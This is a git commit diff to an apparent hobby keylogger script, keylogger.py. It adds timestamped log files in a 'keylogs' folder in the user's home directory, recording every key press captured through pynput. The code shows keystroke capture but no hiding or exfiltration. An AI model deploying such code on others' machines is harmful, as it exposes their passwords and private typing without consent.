0a72556022f4b41a4d64bff1ee093541ae7c7180
Preetham Ananthkumar <preetham.mervin@gmail.com>
2023-09-18 11:01:56 +0100

    Added filenames with timestamp and saved to "keylogs" folder on the user's home directory

--- keylogger.py
+++ keylogger.py
@@ -1,8 +1,18 @@
+import os
+import time
 from pynput.keyboard import Key, Listener
+
+# Define the folder name and create it in the user's home directory
+log_folder = os.path.join(os.path.expanduser("~"), "keylogs")
+os.makedirs(log_folder, exist_ok=True)
+
+# Generate a timestamp for the log file
+timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
 
 # Define a function to write the key presses to a log file.
 def write_to_log(key):
-    with open("keylog.txt", "a") as log_file:
+    log_filename = os.path.join(log_folder, f"keylog_{timestamp}.txt")
+    with open(log_filename, "a") as log_file:
         log_file.write(str(key) + "\n")
 
 # Define a function that listens for key presses and writes them to the log file.
